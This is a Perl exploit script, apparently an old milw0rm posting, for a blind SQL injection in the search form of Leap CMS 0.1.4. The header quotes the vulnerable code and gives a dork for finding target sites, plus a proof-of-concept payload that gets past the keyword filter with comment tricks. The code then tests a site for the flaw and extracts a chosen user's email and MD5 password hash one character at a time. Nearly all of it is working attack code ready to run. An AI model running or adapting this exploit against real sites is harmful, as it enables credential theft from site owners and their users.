@@ -1,0 +1,329 @@
+#!/usr/bin/perl
+#***********************************************************************************************
+#***********************************************************************************************
+#**	       										      **
+#**  											      **
+#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
+#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    
+#**							                                      **
+#**    											      **
+#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+#**					  ¡PROUD TO BE SPANISH!	                              **
+#**											      **
+#***********************************************************************************************
+#***********************************************************************************************
+#
+#----------------------------------------------------------------------------------------------
+#|       	    (Search Post Form) BLIND SQL INJECTION (BSQLi) EXPLOIT	              |
+#|--------------------------------------------------------------------------------------------|
+#|                         	    |   Leap CMS 0.1.4    |		 	              |
+#|  CMS INFORMATION:		     ---------------------				      |
+#|										              |
+#|-->WEB: http://leap.gowondesigns.com/				   		              |
+#|-->DOWNLOAD: http://leap.gowondesigns.com/download.php?leap014.zip		              |
+#|-->DEMO: http://php.opensourcecms.com/scripts/details.php?scriptid=161&name=Leap	      |
+#|-->CATEGORY: CMS / Lite								      |
+#|-->DESCRIPTION: Leap is a single file, template independent, open-source,                   |
+#| 		standards-compliant,extensible content management system for the web...	      |
+#|-->RELEASED: 2009-03-13								      |
+#|											      |
+#|  CMS VULNERABILITY:									      |
+#|											      |
+#|-->TESTED ON: firefox 3                                				      |
+#|-->DORK: "Powered by Leap"								      |
+#|-->CATEGORY: BLIND SQL INJECTION/ PERL EXPLOIT					      |
+#|-->AFFECT VERSION: LAST = 0.1.4 (Maybe <= ?)		            			      |
+#|-->Discovered Bug date: 2009-04-25							      |
+#|-->Reported Bug date: 2009-04-25							      |
+#|-->Fixed bug date: Not fixed								      |
+#|-->Info patch (????): Not fixed							      |   
+#|-->Author: YEnH4ckEr									      |
+#|-->mail: y3nh4ck3r[at]gmail[dot]com							      |
+#|-->WEB/BLOG: N/A									      |
+#|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+#|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		      |
+#----------------------------------------------------------------------------------------------
+#
+#-----------
+#BUG FILE:
+#-----------
+#
+#Path --> [HOME_PATH]/leap.php
+#
+#
+#
+#function contentSearch() {
+#
+#	...
+#
+#
+#if($searchterm=='') return FALSE;
+#
+#        ...
+#	
+#	if (eregi(" AND | NOT | OR ",$search,$matches)) $search=str_replace($matches,'',$search);   <-------BYPASSED (/**/)
+#		
+#		$keywords = explode(' ', $search); //print_r($keywords);    <---------BYPASSED (/**/)
+#		
+#		...
+#		
+#		$query = "SELECT * FROM ".db('prefix')."content WHERE published='1' AND";     <----------START QUERY
+#
+#		if ($keyCount > 1) {
+#
+#			...
+#		
+#		}
+#		else {
+#
+#			$query .=" (INSTR(`title`, '$keywords[0]') > '0' || INSTR(`body`, '$keywords[0]') > '0' || ...)";}  <--------INJECTION HERE
+#			$pquery=$query.';'; $query.=" ORDER BY mod_date DESC LIMIT $pg, $max;"; //echo $query;
+#		
+#			...
+#
+#		}
+#
+#}
+#
+#------------
+#CONDITIONS:
+#------------
+#
+#**gpc_magic_quotes=off
+#
+#---------------------------------------
+#PROOF OF CONCEPT (BLIND SQL INJECTION):
+#---------------------------------------
+#
+#SEARCH --> a')>'1')/*y3nh4ck3r*/AND/*y3nh4ck3r*/1=1#
+#
+#Return: Search for 'a'
+#
+#######################################################################
+#######################################################################
+##*******************************************************************##
+## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+##       GREETZ TO: JosS and all SPANISH Hack3Rs community!          ##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+#
+use LWP::UserAgent;
+use HTTP::Request;
+#Subroutines
+sub lw
+{
+	my $SO = $^O;
+	my $linux = "";
+	if (index(lc($SO),"win")!=-1){
+		$linux="0";
+	}else{
+		$linux="1";
+	}		
+	if($linux){
+		system("clear");
+	}
+	else{
+		system("cls");
+		system ("title Leap CMS 0.1.4 (BLIND SQL Injection) Exploit");
+		system ("color 04");
+	}
+}
+sub request {
+	my $userag = LWP::UserAgent->new;
+	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+	my $request = HTTP::Request -> new(POST => $_[0]);
+	$request->content_type('application/x-www-form-urlencoded');
+	$request->content($_[1]); 
+	my $outcode= $userag->request($request)->as_string;
+	return $outcode;
+}
+sub helper {
+	print "\n\t[<-->] Leap CMS 0.1.4 - (BLIND SQL Injection) Exploit\n";
+	print "\t[<-->] USAGE MODE: [<-->]\n";
+	print "\t[<-->] perl $0 [HOST] [PATH] [Search] [Id]\n";
+	print "\t[<-->] [HOST]: Web.\n";
+	print "\t[<-->] [PATH]: Home Path.\n";
+	print "\t[<-->] [Search]: Something. Default: a (**optional)\n";
+	print "\t[<-->] [id]: Id user. Default: 1 (**optional)\n";
+	print "\t[<-->] Example: perl $0 'www.example.es' 'leap-CMS' 'a' '1'\n"; 
+}
+sub lengthuser{
+#First, user length...
+$exit=0;
+$i=0;
+	while($exit==0){
+		my $searchinjected="searchterm=".$_[2]."')>'1')/*y3nh4ck3r*/AND/*y3nh4ck3r*/(SELECT/*y3nh4ck3r*/length(mail)/*y3nh4ck3r*/FROM/*y3nh4ck3r*/users/*y3nh4ck3r*/WHERE/*y3nh4ck3r*/id=".$_[1].")=".$i++."#"; #injected code
+		$output=&request($_[0],$searchinjected);
+		if ( $output =~ (/No Results Found./))
+		{
+			$exit=0;
+		}else{
+			$exit=1;
+		}
+	}
+#Save column length
+$lengthuser=$i-1;
+print "\t<<<<<--------------------------------------------------------->>>>>\n";
+print "\tUser Length catched!\n";
+print "\tUser Length: ".$lengthuser."\n";
+print "\tBruteforcing values...\n";
+print "\t<<<<<--------------------------------------------------------->>>>>\n";
+return $lengthuser;
+}
+sub bruteforcing {
+my $values="";
+#Getting datas
+$j=1;
+	$i=46;
+	while(($j<=$_[2]) && ($i<=126)){
+		my $searchinjected="searchterm=".$_[4]."')>'1')/*y3nh4ck3r*/AND/*y3nh4ck3r*/ascii(substring((SELECT/*y3nh4ck3r*/".$_[3]."/*y3nh4ck3r*/FROM/*y3nh4ck3r*/users/*y3nh4ck3r*/WHERE/*y3nh4ck3r*/id='".$_[1]."'),".$j.",1))=".$i."#"; #injected code
+		$output=&request($_[0],$searchinjected);
+		if ( $output !~ (/No Results Found./))
+		{
+			$values=$values.chr($i);
+			$j++;
+			$i=45;
+		}
+	if($i==57)
+	{
+		$i=63; #@
+	}
+	if($i==64)
+	{
+		$i=96;
+	}
+#new char
+	$i++; 
+	}
+#Error
+	if(($i>127) || ($j>$_[2])){
+		if(!$values){
+			print "\t<<<<<--------------------------------------------------------->>>>>\n";
+			print "\tEXPLOIT FAILED!\n";
+			print "\tFatal error: Datas doesn't find!\n";
+			print "\tCause: Maybe you have to include more characters on bruteforcing...\n";
+			print "\t<<<<<--------------------------------------------------------->>>>>\n";
+			exit(1);
+		}
+	}
+	
+return $values;
+}
+#Main
+&lw;
+print "\t\t#######################################################\n\n";
+print "\t\t#######################################################\n\n";
+print "\t\t##   Leap CMS 0.1.4 - (BLIND SQL Injection) Exploit  ##\n\n";
+print "\t\t##       ++Conditions: Need magic_quotes=off         ##\n\n";
+print "\t\t##                  Author: Y3nh4ck3r                ##\n\n";
+print "\t\t##          Contact:y3nh4ck3r[at]gmail[dot]com       ##\n\n";
+print "\t\t##                  Proud to be Spanish!             ##\n\n";
+print "\t\t#######################################################\n\n";
+print "\t\t#######################################################\n\n";
+#Init variables
+my $host=$ARGV[0];
+my $path=$ARGV[1];
+#Build the uri
+my $finalhost="http://".$host."/".$path."/index.php?search";
+#Check all variables needed
+$numArgs = $#ARGV + 1;
+	if($numArgs<=1) 
+	{
+		&helper;
+		exit(1);	
+	}
+#Search parameter. It's optional. Default:a
+	if(!$ARGV[2]){
+		$search="a";	
+	}else{
+		$search=$ARGV[2];	
+	}
+#Id-user is optional.Default:1
+	if(!$ARGV[3]){
+		$idhacked="1";	
+	}else{
+		$idhacked=$ARGV[3];	
+	}
+#Testing blind sql injection
+my $finalrequest = $finalhost;	
+#Test blind sql injection
+my $searchinjected="searchterm=".$search."')>'1')/*y3nh4ck3r*/AND/*y3nh4ck3r*/1=1#"; #injected code
+$output=&request($finalrequest, $searchinjected);
+if ( $output =~ (/No Results Found./))
+{   
+	print "\t<<<<<--------------------------------------------------------->>>>>\n";
+	print "\tThis Web is not vulnerable!\n";
+	print "\t--->Maybe:\n";
+	print "\t1.-Patched or gpc_magic_quotes=off\n";
+	print "\t2.-Search parameter hasn't found. Try other!\n";
+	print "\tEXPLOIT FAILED!\n";
+	print "\t<<<<<--------------------------------------------------------->>>>>\n";
+	exit(1);
+}else{ 
+	print "\t<<<<<--------------------------------------------------------->>>>>\n";
+	print "\tWeb is vulnerable!\n";
+	print "\tTested Blind SQL Injection.\n";		
+	print "\tChecking id user...\n"; 
+	print "\t<<<<<--------------------------------------------------------->>>>>\n";
+ 
+}	
+#Test if user exists
+my $searchinjected="searchterm=".$search."')>'1')/*y3nh4ck3r*/AND/*y3nh4ck3r*/(SELECT/*y3nh4ck3r*/COUNT(*)/*y3nh4ck3r*/FROM/*y3nh4ck3r*/users/*y3nh4ck3r*/WHERE/*y3nh4ck3r*/id='".$idhacked."')#"; #injected code
+$output=&request($$finalrequest,$searchinjected);
+if ( $output =~ (/No Results Found./))
+{    
+	print "\t<<<<<--------------------------------------------------------->>>>>\n";
+	print "\tUser doesn't exists!\n";		
+	print "\tEXPLOIT FAILED!\n";
+	print "\t<<<<<--------------------------------------------------------->>>>>\n";
+	exit(1); 
+}else{ 
+
+	print "\t<<<<<--------------------------------------------------------->>>>>\n";
+	print "\tOK...The user exists!\n";		
+	print "\tStarting exploit...\n"; 
+	print "\t<<<<<--------------------------------------------------------->>>>>\n";
+	print "\tWait several minutes...\n"; 
+	print "\t<<<<<--------------------------------------------------------->>>>>\n";
+}	
+#Bruteforcing user...
+$length_mail=&lengthuser($finalrequest,$idhacked,$search);
+$email=&bruteforcing($finalrequest,$idhacked,$length_mail,'mail',$search);
+if(length($email)!=$length_mail)
+{
+	print "\t<<<<<--------------------------------------------------------->>>>>\n";
+	print "\tEXPLOIT FAILED!\n";
+	print "\tFatal error: Different length email!\n";
+	print "\tCause: Maybe you have to include more characters on bruteforcing...\n";
+	print "\t<<<<<--------------------------------------------------------->>>>>\n";
+	exit(1);
+}
+
+print "\t<<<<<--------------------------------------------------------->>>>>\n";
+print "\tGot user!\n";
+print "\tBruteforcing password hash (md5)...\n";
+print "\t<<<<<--------------------------------------------------------->>>>>\n";
+#Bruteforcing password...
+$passhash=&bruteforcing($finalrequest,$idhacked,32,'pwd',$search); #it isn't needed length
+print "\n\t\t*************************************************\n";
+print "\t\t****  EXPLOIT EXECUTED (LeapCMS 0.1.4 BSQLi) ****\n";
+print "\t\t*************************************************\n\n";
+print "\t\tUser-id:".$idhacked."\n";
+print "\t\tE-mail:".$email."\n";
+print "\t\tUser-password(hash):".$passhash."\n\n";
+print "\n\t\t<<----------------------FINISH!-------------------->>\n\n";
+print "\t\t<<---------------Thanks to: y3hn4ck3r-------------->>\n\n";
+print "\t\t<<------------------------EOF---------------------->>\n\n";
+exit(1);
+#Ok...all job done
+
+# milw0rm.com [2009-04-30]
